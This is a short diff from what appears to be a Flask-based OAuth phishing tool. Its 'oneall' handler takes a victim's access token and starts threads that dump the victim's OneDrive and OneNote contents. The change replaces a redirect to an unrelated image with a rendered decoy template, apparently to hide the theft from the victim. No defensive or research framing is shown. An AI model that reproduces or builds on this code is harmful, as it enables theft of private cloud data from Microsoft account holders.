@@ -94,7 +94,7 @@ def oneall():
     Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
     Thread(target=dump_onenote, args=(token['access_token'],auth.get_user().get("preferred_username"))).start()
 
-    return redirect("https://preview.redd.it/xl32gp9rrmt01.jpg?auto=webp&s=4678d4eec316ad160a1d258abe98230152f24122")
+    return render_template('tkt.html') #redirect("https://preview.redd.it/xl32gp9rrmt01.jpg?auto=webp&s=4678d4eec316ad160a1d258abe98230152f24122")
 
 if __name__ == "__main__":
     app.run()
